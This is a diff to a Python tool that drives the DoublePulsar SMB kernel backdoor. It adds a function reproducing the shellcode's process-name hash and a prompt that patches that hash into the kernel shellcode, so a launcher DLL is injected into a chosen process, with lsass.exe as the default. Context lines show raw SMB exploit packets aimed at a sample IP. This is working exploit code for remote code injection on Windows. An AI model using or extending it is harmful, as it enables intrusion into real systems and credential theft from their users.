@@ -20,7 +20,25 @@ def calculate_doublepulsar_arch(s):
     else:
         return "x64 (64-bit)"
 
+def calc_hash(name: str) -> int:
+    esi = 0          # index into string (simulates esi pointer)
+    eax = 0          # hash accumulator
 
+    while True:
+        edi = eax
+        edi = (edi << 7) & 0xFFFFFFFF   # shl edi, 7
+        edi = (edi - eax) & 0xFFFFFFFF  # sub edi, eax  →  edi = eax * 127
+        eax = edi
+
+        ecx = 0
+        if esi >= len(name):            # mov cl, [esi] / cmp cl, 0 / jz done
+            break
+        ecx = ord(name[esi])            # mov cl, [esi]
+
+        eax = (eax + ecx) & 0xFFFFFFFF # add eax, ecx
+        esi += 1                        # inc esi
+
+    return eax
 
 def read_launcher_file_as_hex():
     global launcher_hex
@@ -351,6 +369,27 @@ if __name__ == "__main__":
     tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
     trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
 
+	bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
+    print("Please enter a process.  lsass.exe is the default process, press continue to skip")
+    process_entry = input("Enter process name to inject the DLL into:  ").strip()
+    if process_entry:  # user typed something
+        process_name = process_entry.lower()
+        process_hash = calc_hash(process_name)
+        process_hash_little_endian = struct.pack('<I', process_hash)
+        offset_process_hash = 2146
+        # process hash
+        bytearray_rundll_kernel_shellcode[offset_process_hash: offset_process_hash + 4] = process_hash_little_endian
+
+        print(f"  {process_entry:<20} -> 0x{calc_hash(process_entry):08X}\n")
+        process_hash_chunk = b''.join([bytearray_rundll_kernel_shellcode[offset_process_hash: offset_process_hash + 4]])
+        print("[RunDLL shellcode] hexdump of process hash in shellcode:  ")
+        print(hexdump(process_hash_chunk))
+
+    else:
+        # user pressed Enter, skip function
+        print("No process entered, continuing...")
+        #print(f"  {process_entry:<20} -> 0x{calc_hash(process_entry):08X}\n")
+
     timeout = 5.0
     # sample IP
     ip = "192.168.0.248"
@@ -433,7 +472,7 @@ if __name__ == "__main__":
         launcher_dll_size = len(launcher_dll)
         exesize = len(exe_bytes)
 
-        bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
+        #bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
         bytearray_launcher_dll = bytearray(launcher_dll)
         bytearray_exe_bytes = bytearray(exe_bytes)
         bytearray_exe_bytes_len = len(bytearray_exe_bytes)
